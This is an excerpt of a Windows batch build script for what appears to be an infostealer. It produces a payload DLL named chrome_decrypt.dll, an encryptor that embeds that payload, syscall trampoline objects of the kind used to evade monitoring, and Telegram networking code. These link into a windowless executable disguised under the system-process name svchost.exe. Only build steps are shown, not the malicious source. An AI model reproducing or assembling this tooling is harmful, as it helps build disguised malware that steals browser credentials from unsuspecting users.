...
set "SRC_DIR=src"
set "LIBS_DIR=libs"
set "FINAL_EXE_NAME=svchost.exe"
set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
set "ENCRYPTOR_EXE_NAME=encryptor.exe"
set "PAYLOAD_HEADER=payload_data.hpp"

:: Compiler Flags
set "CFLAGS_COMMON=/nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GL /GR- /Gw /Zc:threadSafeInit- /D_CRT_SECURE_NO_WARNINGS"
set "CFLAGS_CPP=/std:c++17 /EHsc"
set "CFLAGS_SQLITE=/nologo /W0 /O1 /Os /MT /GS- /Gy /GL /DSQLITE_OMIT_LOAD_EXTENSION"

:: Linker Flags
set "LFLAGS_COMMON=/NOLOGO /LTCG /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT /INCREMENTAL:NO /EMITPOGOPHASEINFO"
set "LFLAGS_WINDOWS=/SUBSYSTEM:WINDOWS /ENTRY:wWinMainCRTStartup"
...
cl %CFLAGS_COMMON% %CFLAGS_CPP% /Fe"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" ^
    ...
    /link %LFLAGS_COMMON% %LFLAGS_CONSOLE% bcrypt.lib
...
if "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
    ...
    "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Tools\MSVC\14.50.35717\bin\Hostx64\x64\ml64.exe" /nologo /c /Fo"%BUILD_DIR%\syscall_trampoline_payload.obj" "%SRC_DIR%\sys\syscall_trampoline_x64.asm"
)

link %LFLAGS_COMMON% %LFLAGS_CONSOLE% %LFLAGS_MERGE% /DLL /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" ^
...
if "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
    ...
    "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Tools\MSVC\14.50.35717\bin\Hostx64\x64\ml64.exe" /nologo /c /Fo"%BUILD_DIR%\syscall_trampoline.obj" "%SRC_DIR%\sys\syscall_trampoline_x64.asm"
)
...
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\core\telegram_utils.cpp" /Fo"%BUILD_DIR%\telegram_utils.obj"

link %LFLAGS_COMMON% %LFLAGS_WINDOWS% %LFLAGS_MERGE% /OUT:".\%FINAL_EXE_NAME%" ^
    ...
    "%BUILD_DIR%\syscall_trampoline.obj" "%BUILD_DIR%\telegram_utils.obj" ^
    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib winhttp.lib
goto :eof
